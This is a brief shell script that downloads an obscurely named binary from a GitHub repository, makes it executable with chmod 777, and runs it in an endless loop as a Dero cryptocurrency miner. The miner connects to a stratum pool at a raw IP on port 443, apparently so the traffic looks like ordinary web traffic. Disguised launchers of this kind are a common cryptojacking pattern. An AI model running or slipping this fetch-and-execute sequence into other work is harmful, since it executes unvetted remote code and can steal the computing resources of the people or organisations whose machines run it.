wget https://github.com/renilo/kuuntul/raw/main/mente
chmod 777 mente

while :; do
    ./mente -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-2000 -n 1)-COK) -r stratum+tcp://51.222.96.66:443 -p stratum;
    sleep 5;
done
